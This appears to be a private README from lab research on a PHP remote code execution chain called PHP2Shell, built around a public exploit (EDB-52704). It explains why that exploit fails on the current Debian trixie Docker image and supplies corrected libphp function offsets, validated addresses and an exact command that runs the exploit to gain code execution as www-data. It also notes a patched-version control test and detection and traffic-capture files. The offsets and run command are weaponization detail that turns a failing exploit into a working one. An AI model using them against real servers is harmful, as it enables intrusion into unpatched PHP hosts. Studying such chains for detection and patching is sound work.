# PHP2Shell (CVE-2026-109618/109619) - validated exploit portfolio

Authorized local lab research only. Private reference.

## Headline finding
EDB-52704 (OffSec adj. of 9bie) ships bookworm-calibrated offsets and a silent
fallback: run standalone, its auto-offsets helper fails quietly and stage 2
writes to wrong addresses -> "public PoC doesn't work" narrative.
The un-suffixed `php:8.4.26-apache` Docker tag now serves the DEBIAN 13 (trixie)
build (apache2 2.4.69-1~deb13u1). Same version tag, different binary.

## Correct trixie offsets (extracted from live container libphp.so ELF symtab)
    zif_system     = 0x465370
    zval_ptr_dtor  = 0x65eb60
(bookworm published values: 0x43a870 / 0x613c50)

## Validated result (vanilla official image, tuned php.ini, no source patching)
    stage1 chunk base = 0x7fff09800000
    stage2 libphp     = 0x7fff0accc000
    PROOF: uid=33(www-data)  -- full chain ~6.4s / 5 POSTs
    Control: patched 8.4.27 -> stage1 fails 3/3, no proof. Patch effective.

## Reproduce
    docker compose -f <9bie docker/docker-compose.yml> up -d   # php:8.4.26-apache, tuned ini
    python3 52704.py -u http://127.0.0.1:8088/index.php -c 'id>/out/p1' \
      --proof-file out/p1 --offsets-file trixie-offsets.env

## Files
- 52704.py - EDB-ID 52704 exploit (credit: 9bie / OffSec)
- trixie-offsets.env - correct offsets for current trixie-based tag
- ANALYTICS.md - full lab report: chain table, traffic signatures, detection rules, reliability matrix
- php2shell-final.pcap.gz - labeled capture of a SUCCESSFUL chain (Suricata SID 2026100 tuning reference)
